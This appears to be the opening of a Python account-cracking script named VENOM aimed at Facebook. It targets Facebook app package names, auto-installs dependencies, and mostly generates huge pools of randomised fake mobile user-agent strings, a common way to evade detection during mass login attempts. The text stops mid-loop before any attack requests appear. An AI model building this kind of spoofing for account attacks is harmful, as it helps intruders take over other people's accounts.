#يرجى حفاظ على برمجة ادات كما هيا لادعي الى اعادة برمجتها لانها لا تعمل اذا تم تغير جزء منها مهما كان جميع حقوق محفوظة MR.ACHRAF(اسم كامل: عقاب محمد) 
#All rights reserved by MR. VENOM MOHAMED OGAB
#استمع وشكرا 2021-2026
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4
    #import dz
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    print('\n Installing missing modules ...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('python VENOM.py')
try:
    os.mkdir('/sdcard/VENOM')
except:pass
import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess 
from concurrent.futures import ThreadPoolExecutor
import requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess
ugen=[]
for xd in range(10000):
    rr = random.randint
    build_b = random.choice(["001","002","003","011","012","014","015","020","021","022","023","024"])
    bl_typ = random.choice(["TKQ1","SKQ1","TP1A","RKQ1","SP1A","RP1A","PPR1","QP1A"])
    oppo = random.choice(["CPH2461","CPH2451","PCGM00","PBBM00","PFZM10","PGGM10","PECT30","PCHM10","PEAT00","PEYM00","PESM10","PFGM00"])
    infinix = random.choice(["Infinix X669C","Infinix X6823","Infinix X676C","Infinix X683","Infinix X689C","Infinix X6811","Infinix X612B","Infinix X6810","Infinix X665E"])
    redmi = random.choice(["2211133G","M2004J19C","22041219I","22101316UG","2209116AG","M2010J19SY","M2012K11C","Redmi Note 7","Redmi Note 8","Redmi Note 5"])
    um2 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {oppo} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um1 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {redmi} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um3 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {infinix} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um4 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {infinix}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,114))}.0.{str(rr(4900,5700))}.{str(rr(70,150))} Mobile Safari/537.36"
    ugen.append(um2)
    ugen.append(um3)
    ugen.append(um1)
    ugen.append(um4)
for xhd in range(1000):
    a = random.choice(['de-at','in-id','ms-my','uk-ua','en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr','en-au','th-th','hi-in','zh-tw','my-zg','en-nz','en-ca','es-mx','ko-kr','el-gr','en-ez','ar-ae','fr-ch','nl-nl','gu-in'])
    b = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    b2 = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c2 = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    d = f"Mozilla/5.0 (Linux; U; Android {str(random.randint(6,14))}; {a}; OPPO {b}{str(random.randint(10,99))}{c} Build/{b2}{str(random.randint(1,999))}{c2}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(75,117))}.0.{str(random.randint(2500,5900))}.{str(random.randint(80,200))} Mobile Safari/537.36 HeyTapBrowser/{str(random.randint(6,47))}.{str(random.randint(7,8))}.{str(random.randint(2,40))}.{str(random.randint(1,9))}"
    ugen.append(d)
for xd in range(1000):
   rr = random.randint; rc = random.choice
   aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
   lonte = f"{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}"
   build_nokiax = ['JDQ39','JZO54K']
   oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
   redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
   realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020","RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
   infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]
   samsung = ["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ","G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U", "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B","S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"]
   gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']  
   strvoppo = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(oppo))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
   strvredmi = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvoppo1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(oppo))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvinfinix = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; Infinix {str(rc(infinix))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvsamsung = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(samsung))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvredmi1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
   strvnokiax = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
   strvgt = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
  
   ugen.append(strvoppo)
   ugen.append(strvredmi)
   ugen.append(strvoppo1)
   ugen.append(strvinfinix)
   ugen.append(strvsamsung)
   ugen.append(strvredmi1)
   ugen.append(strvnokiax)
   ugen.append(strvgt)
   
for op in range(1000):
    rr = random.randint
    rc = random.choice
    bahasa = random.choice(["en","fr","ru","tr","id","pt","es","en-GB"])
    ua1 = f"Opera/9.80 (BlackBerry; Opera Mini/8.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
    ua2 = f"SAMSUNG-GT-S3802 Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
